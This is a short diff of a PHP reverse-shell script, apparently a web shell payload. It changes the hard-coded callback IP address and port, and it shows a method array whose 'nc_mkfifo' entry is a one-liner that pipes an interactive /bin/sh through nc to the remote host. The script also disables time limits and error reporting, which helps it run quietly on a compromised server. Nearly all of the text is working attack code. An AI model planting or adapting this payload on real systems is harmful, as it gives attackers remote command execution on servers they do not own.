@@ -2,8 +2,8 @@
 set_time_limit(0);
 error_reporting(0);
 
-$ip = '165.101.18.23';
-$port = 443;
+$ip = '168.10.10.10';
+$port = 4433;
 
 $methods = array(
     'nc_mkfifo' => "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f",
